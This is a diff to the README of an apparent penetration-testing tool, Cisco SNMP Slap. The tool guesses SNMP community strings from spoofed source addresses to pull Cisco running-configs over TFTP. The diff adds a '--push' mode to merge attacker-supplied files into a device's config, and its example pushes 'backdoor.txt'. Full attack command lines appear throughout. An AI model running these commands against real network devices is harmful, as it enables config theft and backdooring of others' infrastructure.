@@ -19,6 +19,11 @@ This tool allows you to try one or more community strings against a Cisco device
 from one or more IP addresses. When specifying IP addresses you can choose to
 subsequently or randomly go through a range of source addresses.
 
+As of v1.1.0 the tool also supports pushing a config file TO a device using
+the `--push` flag. This reverses the TFTP direction so that the target device
+pulls a file from your TFTP server and merges it into its running-config.
+You can also specify a custom TFTP filename with `--filename`.
+
 To specifying range of source IP addresses to check an initial source address
 and IP mask are supplied. Any bits set in the IP mask will be used to generate
 source IP addresses by altering the initial source address.
@@ -72,7 +77,7 @@ save some time by assuming a whole subnet will be allowed access rather
 than just one IP address.
 
     root@Athena:/home/notroot/cisco-snmp-slap# ./slap.py seqmask cisco 10.0.0.2 10.0.0.5 0.255.255.0 10.0.0.1 /tftproot/
-    Cisco SNMP Slap, v1.0.0
+    Cisco SNMP Slap, v1.1.0
     Darren McDonald, darren.mcdonald@nccgroup.com
     Community String:  cisco
     TFTP Server IP  :  10.0.0.2
@@ -108,7 +113,7 @@ For example to repeat the same attack using a list of community strings in in
 list.txt the following arguments should be used.
 
     root@Athena:/home/notroot/cisco-snmp-slap# ./slap.py seqmask_l list.txt 10.0.0.2 10.0.0.5 0.255.255.0 10.0.0.1 /tftproot/
-    Cisco SNMP Slap, v1.0.0
+    Cisco SNMP Slap, v1.1.0
     Darren McDonald, darren.mcdonald@nccgroup.com
     Community File:    list.txt
     TFTP Server IP  :  10.0.0.2
@@ -132,7 +137,29 @@ list.txt the following arguments should be used.
 
 Now each IP address is checked with each community string in list.txt.
 
-SUPPORT 
+PUSHING A CONFIG
+================
+By default the tool pulls a device's running-config to your TFTP server.
+With `--push` you can go the other way: place a config file on your TFTP
+server and have the target device pull it and merge it into its running-config.
+
+For example, say you've already grabbed the running config (or crafted your
+own) and want to push a modified version back to the device:
+
+    ./slap.py single --push --filename backdoor.txt cisco 10.0.0.2 10.100.100.100 10.0.0.1
+
+This tells the device at `10.0.0.1` to pull `backdoor.txt` from the TFTP
+server at `10.0.0.2`, spoofing from `10.100.100.100` with community string
+`cisco`. The file gets merged into running-config.
+
+The `--push` flag works with all modes (single, seqmask, randmask and their
+`_l` variants). When pushing, the tftp root path argument is optional since
+the tool doesn't need to watch for an incoming file.
+
+The `--filename` flag also works in pull mode if you want the device to write
+to a filename other than the default `cisco-config.txt`.
+
+SUPPORT
 =======
 
 As programming languages go Python is a simple language, easy to read and write
@@ -152,3 +179,4 @@ VERSIONS
 * 0.3 added community string file list feature, first public version
 * 0.3.1 now uses os.sep so that paths work correctly on Windows
 * 1.0.0 Modernized to Python 3, added argparse, explicit imports, PEP 8 style
+* 1.1.0 Added --push mode to write configs to devices, --filename for custom TFTP filenames
